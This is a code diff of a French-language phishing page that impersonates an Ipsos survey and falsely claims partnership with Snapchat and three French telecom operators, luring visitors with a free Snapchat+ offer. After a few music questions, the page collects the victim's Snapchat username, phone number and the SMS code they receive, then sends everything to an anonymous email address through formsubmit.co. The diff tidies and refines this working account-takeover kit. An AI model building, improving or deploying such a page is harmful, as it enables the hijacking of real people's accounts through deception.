@@ -2,80 +2,83 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Sondage|Ipsos</title>
+<title>Sondage | Ipsos</title>
 
-<!-- Police Inter -->
+<!-- Police -->
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-body { 
-    font-family: 'Inter', sans-serif; 
-    background:#f4f6f9; 
-    margin:0; 
-    font-size:20px; 
+body {
+    font-family: 'Inter', sans-serif;
+    background:#f4f6f9;
+    margin:0;
 }
 
-/* RESPONSIVE */
-@media (max-width: 600px) {
-    .box {
-        margin:20px;
-        padding:25px;
-    }
-    h2 { font-size:26px; }
-    p { font-size:20px; }
-    button { font-size:20px; padding:12px 20px; }
-    #partenariat { font-size:20px; }
-}
-
-/* HEADER AVEC LOGO */
+/* HEADER */
 .header {
     background:#003b7a;
-    padding:30px 30px;
+    padding:25px 30px;
     display:flex;
     align-items:center;
     justify-content:center;
     position:relative;
 }
+
 .header img {
-    height:55px;
-    cursor:pointer;
+    height:50px;
 }
 
-/* TEXTE CENTRÉ */
-.header-text {
-    color:white;
-    font-size:28px;
-    font-weight:bold;
-}
-
-/* LOGO À GAUCHE */
 .header a {
     position:absolute;
     left:30px;
 }
 
+.header-text {
+    color:white;
+    font-size:26px;
+    font-weight:700;
+}
 
-/* CONTENU CENTRAL */
+/* LOGO FIXE */
+.logo-fixed {
+    position:fixed;
+    top:15px;
+    right:15px;
+    height:45px;
+    z-index:999;
+}
+
+/* CONTENU */
 .box {
     max-width:650px;
-    margin:70px auto;
+    margin:60px auto;
     background:white;
-    padding:50px;
+    padding:45px;
     border-radius:12px;
     box-shadow:0 4px 12px rgba(0,0,0,0.1);
 }
 
-h2 { font-size:32px; margin-bottom:20px; }
-p { font-size:24px; margin-bottom:25px; }
+h2 { font-size:30px; margin-bottom:20px; }
+p { font-size:20px; margin-bottom:25px; }
 
+input {
+    width:100%;
+    padding:14px;
+    font-size:18px;
+    border-radius:6px;
+    border:1px solid #ccc;
+}
+
+/* BOUTON */
 button {
-    padding:15px 28px;
+    margin-top:25px;
+    padding:14px 26px;
     background:#0078d4;
     color:white;
     border:0;
     border-radius:8px;
     cursor:pointer;
-    font-size:22px;
+    font-size:20px;
 }
 button:hover { background:#005fa3; }
 button:disabled {
@@ -83,63 +86,61 @@ button:disabled {
     cursor:not-allowed;
 }
 
-/* BARRE DE PROGRESSION */
+/* PROGRESSION */
 .progress-container {
     width:100%;
     height:10px;
     background:#e0e0e0;
     border-radius:5px;
     margin-bottom:25px;
-    overflow:hidden;
 }
 
 .progress-bar {
     height:100%;
     width:0%;
     background:#0078d4;
-    transition: width 0.3s ease;
+    transition:width 0.3s ease;
 }
 
 /* PARTENARIAT */
 #partenariat {
     display:none;
     text-align:center;
-    font-size:26px;
-    margin-top:40px;
+    margin-top:35px;
+    font-size:18px;
+    color:#555;
 }
-    /* LOGO PERMANENT EN HAUT À DROITE */
-.logo-fixed {
-    position: fixed;
-    top: 15px;
-    right: 15px;
-    height: 45px;
-    z-index: 9999;
-    cursor: pointer;
+
+/* RESPONSIVE */
+@media(max-width:600px){
+    .box{margin:20px;padding:25px}
+    h2{font-size:24px}
 }
 </style>
 </head>
-<body><img src="SnapchatLogo.png" class="logo-fixed" alt="Logo">
+
+<body>
+
+<img src="SnapchatLogo.png" class="logo-fixed" alt="Snapchat">
 
 <div class="header">
-    <a href="index.html" onclick="return confirmerRetour();">
-        <img src="logo.png" alt="Logo">
+    <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos réponses seront perdues.')">
+        <img src="logo.png" alt="Ipsos">
     </a>
-
-    <div class="header-text"><h2>Ipsos sondage</h2></div>
+    <div class="header-text">Ipsos – Sondage</div>
 </div>
 
-<!-- ÉCRAN INTRO -->
+<!-- INTRO -->
 <div class="box" id="intro">
-    <h2>Sondage éphémère</h2>
-    <p>Après avoir répondu à ce sondage, VOUS AUREZ SNAPCHAT + 🎁</p>
-    <button onclick="demarrerSondage()">Commencer</button>
+    <h2>Sondage express</h2>
+    <p>Répondez à ce court sondage pour bénéficier de <strong>Snapchat+</strong> 🎁</p>
+    <button onclick="demarrer()">Commencer</button>
 </div>
 
-<!-- PAGE INTERMÉDIAIRE -->
+<!-- INTERMÉDIAIRE -->
 <div class="box" id="intermediaire" style="display:none;">
-    <h2>Merci pour vos réponses à ce sondage express !</h2>
-    <p>Dans un instant, vous pourrez bénéficier de Snapchat+ pendant 1 mois !<br>
-    Nous avons besoin d'une dernière vérification afin de vous offrir l'abonnement.</p>
+    <h2>Merci !</h2>
+    <p>Encore une étape avant de finaliser votre participation.</p>
     <button onclick="continuer()">Continuer</button>
 </div>
 
@@ -152,161 +153,110 @@ button:disabled {
     <h2 id="titre"></h2>
     <p id="question"></p>
     <div id="reponses"></div>
-    <button onclick="suivant()">Suivant</button>
-</div>
 
-<!-- PARTENARIAT (affiché uniquement aux questions 4,5,6) -->
-<div id="partenariat">
-    <div><strong>Snapchat + Ipsos sondage</strong></div>
-    <div>En partenariat avec Bouygues Telecom, Orange et SFR</div>
+    <button id="btnSuivant" onclick="suivant()" disabled>Suivant</button>
+
+    <div id="partenariat">
+        <strong>Snapchat + Ipsos</strong><br>
+        En partenariat avec Bouygues Telecom, Orange et SFR
+    </div>
 </div>
 
 <script>
-function confirmerRetour() {
-    return confirm("Attention : si vous retournez à l'accueil, le sondage en cours sera perdu.");
-}
+const titre = "Sondage pour bénéficier de Snapchat+";
 
-function demarrerSondage() {
-    document.getElementById("intro").style.display = "none";
-    document.getElementById("sondage").style.display = "block";
-    afficherQuestion();
-    updateProgress();
-}
-
-let titre = "Sondage pour bénéficier de Snapchat +";
-
-let questions = [
-    { text: "Quel est ton artiste ou groupe préféré ?", type: "text", placeholder: "Exemple:Niska" },
-    { text: " Quel artiste écoute tu en ce moment sur Deezer?", type: "text", placeholder: "Exemple:Niska" },
-    { text: " Quel artiste aimerais tu découvrir davantage sur Deezer?", type: "text", placeholder: "Exemple:Jul" },
-    { text: "Quel est votre nom d'utilsateur snapchat?", type: "text", placeholder: "Entrez votre pseudo Snapchat" },
-    { text: "Quel est votre numéro de téléphone?", type: "text", placeholder: "XXXXXXXXXX" },
-    { text: "Entrez le code qui vous a été envoyé par SMS", type: "text", placeholder: "XXXX" }
+const questions = [
+    { text:"Quel est ton artiste ou groupe préféré ?", type:"text", placeholder:"Ex : Niska" },
+    { text:"Quel artiste écoutes-tu actuellement sur Deezer ?", type:"text", placeholder:"Ex : Damso" },
+    { text:"Quel artiste aimerais-tu découvrir davantage ?", type:"text", placeholder:"Ex : Jul" },
+    { text:"Quel est ton nom d'utilisateur Snapchat ?", type:"text", placeholder:"Pseudo Snapchat" },
+    { text:"Quel est ton numéro de téléphone ?", type:"tel", placeholder:"0601020304" },
+    { text:"Entre le code reçu par SMS", type:"text", placeholder:"XXXX" }
 ];
 
-let i = 0;
+let indexQuestion = 0;
+let reponsesUtilisateur = [];
 
 document.getElementById("titre").textContent = titre;
 
-function afficherQuestion() {
-    let q = questions[i];
-    document.getElementById("question").textContent = q.text;
+function demarrer(){
+    intro.style.display="none";
+    sondage.style.display="block";
+    afficherQuestion();
+}
 
-    let zone = document.getElementById("reponses");
-    zone.innerHTML = "";
+function afficherQuestion(){
+    const q = questions[indexQuestion];
+    question.textContent = q.text;
 
-    if (q.type === "text") {
-        zone.innerHTML = `<input id="champ" type="text" placeholder="${q.placeholder || ''}" oninput="verifierChamp()" style="width:100%; font-size:22px; padding:10px;">`;
-    }
+    reponses.innerHTML = `
+        <input type="${q.type}" id="champ"
+        placeholder="${q.placeholder || ''}"
+        oninput="verifier()">
+    `;
 
-    // Afficher partenariat uniquement aux questions 4, 5, 6
-    document.getElementById("partenariat").style.display = (i >= 3 && i <= 5) ? "block" : "none";
-
-    document.querySelector("#sondage button").disabled = true;
-
+    btnSuivant.disabled = true;
     updateProgress();
-}
-/* ACTIVER/DÉSACTIVER LE BOUTON */
-function verifierChamp() {
-    let input = document.getElementById("champ");
-    let bouton = document.querySelector("#sondage button");
-    bouton.disabled = !input.value.trim();
+
+    partenariat.style.display =
+        indexQuestion >= 3 ? "block" : "none";
 }
 
-/* BARRE DE PROGRESSION */
-function updateProgress() {
-    let progress = ((i) / questions.length) * 100;
-    document.getElementById("progressBar").style.width = progress + "%";
+function verifier(){
+    btnSuivant.disabled = !champ.value.trim();
 }
 
-function suivant() {
-    let q = questions[i];
+function updateProgress(){
+    progressBar.style.width =
+        ((indexQuestion+1)/questions.length*100) + "%";
+}
 
-    if (q.type === "text") {
-        let input = document.querySelector("#reponses input");
-        if (!input.value.trim()) {
-            alert("Veuillez remplir ce champ avant de continuer.");
-            return;
-        }
-    }
+function suivant(){
+    const val = champ.value.trim();
 
-    if (q.text.includes("numéro")) {
-        let tel = document.querySelector("#reponses input").value.trim();
-        if (!/^[0-9]{10}$/.test(tel)) {
-            alert("Veuillez entrer un numéro de téléphone valide (10 chiffres).");
-            return;
-        }
-    }
-
-    i++;
-
-    // PAGE INTERMÉDIAIRE APRÈS LA 3ème QUESTION
-    if (i === 3) {
-        document.getElementById("sondage").style.display = "none";
-        document.getElementById("intermediaire").style.display = "block";
+    if(questions[indexQuestion].type==="tel" && !/^[0-9]{10}$/.test(val)){
+        alert("Numéro invalide (10 chiffres)");
         return;
     }
 
-    if (i < questions.length) {
+    reponsesUtilisateur[indexQuestion] = val;
+    indexQuestion++;
+
+    if(indexQuestion===3){
+        sondage.style.display="none";
+        intermediaire.style.display="block";
+        return;
+    }
+
+    if(indexQuestion < questions.length){
         afficherQuestion();
     } else {
-        document.querySelector("#sondage").innerHTML =
-        "<h2>Nous arrivons à la fin du sondage.<br><br>" +
-        "Un message vous sera envoyé dans les prochaines 24 heures pour vous informer " +
-        "si vous avez remporté Snapchat+.<br><br>" +
-        "À bientôt chez Ipsos !</h2>";
-
-        envoyerReponses(); // 🔥 Envoi automatique à la fin
+        sondage.innerHTML = `
+            <h2>Merci pour votre participation !</h2>
+            <p>Vous recevrez un message prochainement.</p>
+        `;
+        envoyer();
     }
 }
 
-function continuer() {
-    document.getElementById("intermediaire").style.display = "none";
-    document.getElementById("sondage").style.display = "block";
+function continuer(){
+    intermediaire.style.display="none";
+    sondage.style.display="block";
     afficherQuestion();
 }
-</script>
 
-<!-- PARTENARIAT (déjà stylé + responsive) -->
-<div id="partenariat">
-    <div><strong>Snapchat + Ipsos sondage</strong></div>
-    <div>En partenariat avec Bouygues Telecom, Orange et SFR</div>
-</div>
-
-<!-- SCRIPT D’ENVOI VERS 2 MAILS -->
-<script>
-function envoyerReponses() {
-    let data = {};
-
-    // Récupérer toutes les réponses
-    questions.forEach((q, index) => {
-        let input = document.querySelector("#reponses input");
-        data[q.text] = input ? input.value : "";
+function envoyer(){
+    const formData = new FormData();
+    questions.forEach((q,i)=>{
+        formData.append(q.text, reponsesUtilisateur[i] || "");
     });
 
-    // Convertir en FormData
-    let formData = new FormData();
-    for (let key in data) {
-        formData.append(key, data[key]);
-    }
-
-    // Envoi vers email 1
-    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
-        method: "POST",
-        body: formData
+    fetch("https://formsubmit.co/anonymous2026b@protonmail.com",{
+        method:"POST",
+        body:formData
     });
-
-    // Envoi vers email 2
-    fetch("https://formsubmit.co/MAIL2", {
-        method: "POST",
-        body: formData
-    });
-
-    alert("Merci ! Vos réponses ont été envoyées.");
 }
 </script>
 
 </body>
 </html>
-
-
